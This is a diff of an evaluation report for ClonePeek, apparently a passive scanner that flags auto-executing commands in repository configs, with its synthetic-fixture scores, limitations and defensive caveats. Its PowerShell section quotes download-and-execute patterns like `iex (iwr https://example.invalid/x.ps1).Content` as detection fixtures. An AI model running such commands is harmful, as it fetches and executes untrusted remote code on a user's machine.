@@ -1,31 +1,105 @@
-# Synthetic evaluation — ClonePeek v0.2.0
+# Synthetic execution-config evaluation — ClonePeek v0.2.2
 
-**This is not real-world malware detection accuracy.** These 12 examples were intentionally constructed to exercise known rules and expose gaps; results cannot be generalized to arbitrary open-source repositories.
+**These numbers are not real-world security detection accuracy.** All 46
+fixtures are small, consent-safe, intentionally hand-authored examples, not a
+random or representative sample of open-source repositories or attacks. They
+were constructed from known detection rules and modeled limitations. Their
+labels are subjective review judgments, not ground truth that a repository is
+malicious.
 
-## Reproduce
+## Reproduce exactly
 
-From the source checkout (Python 3.10+):
+Use Python 3.10+ from a source checkout:
 
 ```bash
 python -m pip install -e .
 python -m evaluation.evaluate
 python -m evaluation.evaluate --format json
-python -m unittest discover -s tests
+python -m unittest discover -s tests -v
 ```
 
-Fixtures are version-controlled in [`evaluation/cases.json`](../evaluation/cases.json). Each case contains a single simulated configuration, an independently chosen `high_risk` label, and a human-readable rationale. The runner builds temporary directories and calls the *passive scanner*—none of the fixture commands runs. All network strings use the reserved `.invalid` domain. The threshold treats only `high` and `critical` ClonePeek findings as predicted high-risk.
+The fixed corpus is versioned in
+[evaluation/cases.json](../evaluation/cases.json). Every case stores
+a unique ID, a configuration path, the content to scan, a separately
+specified high-risk Boolean label, expected execution-surface rules and
+an English rationale. The evaluator creates one private temporary directory
+per case, writes a harmless configuration, and invokes the real passive
+scanner. It never launches script, shell, PowerShell, Git hooks or MCP code
+from a fixture. Download URLs in simulated commands use `.invalid`
+domains. All created fixture data is deleted when evaluation finishes.
 
-## Fixed-fixture results
+## High-risk classification at a high/critical threshold
 
-| Outcome | Count |
+| Outcome | Cases |
 | --- | ---: |
-| True positive | 6 |
-| False positive | 1 |
-| False negative | 1 |
-| True negative | 4 |
-| Precision (6 / 7) | 85.7% |
-| Recall (6 / 7) | 85.7% |
+| True positives | 15 |
+| False positives | 3 |
+| False negatives | 2 |
+| True negatives | 26 |
+| Total | 46 |
 
-The **false positive** is a benign VS Code `folderOpen` `echo hello` task; the risk of automatic execution is real, but a manual reviewer would not call that command malicious. The **false negative** is a plausible malicious indirect script launched through `sh ./scripts/setup.sh`: ClonePeek inventories the lifecycle entry point but does not inspect the shell script it invokes. A medium finding is still returned, but this synthetic high-risk classification is missed.
+**Precision = 15/18 = 83.3%. Recall = 15/17 = 88.2%.**
+This is a score on this designed fixture set, **not** a measured estimate
+for internet repositories. None of these labels says a given execution
+surface is malicious; the threshold indicates relative review urgency.
 
-These limitations make clear why **a clean or medium report is not a safety guarantee**. Synthetic scores may fall sharply on new datasets, different platforms, and unfamiliar malicious behaviors. Do not market this score as real-world accuracy. Future work: collect consented, labeled, representative benign and malicious configurations; version the corpus and publish per-rule confidence intervals where the sample permits.
+Three **false positives** are harmless folder-open VS Code tasks
+(an `echo`, a hidden-terminal `echo`, and a syntax check). They are still
+real execution surfaces, which ClonePeek intentionally labels `high` by
+default. Two **false negatives** are dangerous behavior inside a
+referenced local script, which the scanner does not follow. Those still
+appear as `medium` npm lifecycle findings, not as a clean bill of health.
+
+## Per-rule surface-presence evaluation
+
+The following separate metric asks whether a rule's **execution surface**
+was recognized in a particular fixture. This is not the same as
+high-risk classification or proof of malicious code.
+
+| Rule | Labeled positives | TP | FP | FN | Corpus precision | Corpus recall |
+| --- | ---: | ---: | ---: | ---: | ---: | ---: |
+| vscode-folder-open | 5 | 5 | 0 | 0 | 100% | 100% |
+| npm-lifecycle | 12 | 12 | 0 | 0 | 100% | 100% |
+| devcontainer-lifecycle | 5 | 5 | 0 | 0 | 100% | 100% |
+| devcontainer-feature | 2 | 2 | 0 | 0 | 100% | 100% |
+| mcp-server-process | 5 | 5 | 0 | 0 | 100% | 100% |
+| claude-hook-command | 7 | 7 | 0 | 0 | 100% | 100% |
+| config-parse | 2 | 2 | 0 | 0 | 100% | 100% |
+| oversize-config | 0 | 0 | 0 | 0 | n/a | n/a |
+| unreadable-config | 0 | 0 | 0 | 0 | n/a | n/a |
+
+The evaluator reports per-rule confusion counts and
+Wilson 95% intervals with the JSON output. **Perfect scores on tiny,
+purposely chosen fixtures are not evidence of perfect recall**.
+The Wilson interval is a diagnostic under a hypothetical independent
+sample; the corpus is neither independent nor representative, so those
+intervals must not be promoted as real-world performance estimates.
+For a rule with zero support, recall is correctly reported as `null`,
+not 100%.
+
+## Windows PowerShell coverage
+
+New synthetic fixtures cover `iwr ... | iex`,
+`iex (iwr https://example.invalid/x.ps1).Content`,
+the longer `Invoke-Expression (Invoke-WebRequest -Uri ...).Content`,
+`-EncodedCommand`, benign `Write-Host`, benign `Get-ChildItem`,
+and ordinary local PowerShell launch arguments. The new
+expression-style download-and-execute examples **failed before the
+v0.2.2 detector fix** and classify as `critical` after it.
+Harmless PowerShell examples do not classify as critical.
+
+## Limitations and next evaluation step
+
+- Only known, recognized JSON/JSONC configuration families are tested.
+  Arbitrary nested scripts, archives, shell aliases, CI/CD provider
+  configuration and unfamiliar formats may escape detection.
+- Treat an execution surface as a prompt for manual review, not a verdict
+  about author intent or command safety.
+- A high-risk score can be wrong in both directions; even a synthetic corpus
+  with a 100% score would not justify a field claim.
+- For externally valid estimates, recruit independent reviewers to label
+  representative permitted repository samples, keep a blind holdout, track
+  agreement and report uncertainty. Do not tune against the final holdout.
+
+See [the heuristic rules](RULES.md), [threat model](THREAT_MODEL.md),
+and [the full evaluation source](../evaluation/evaluate.py).
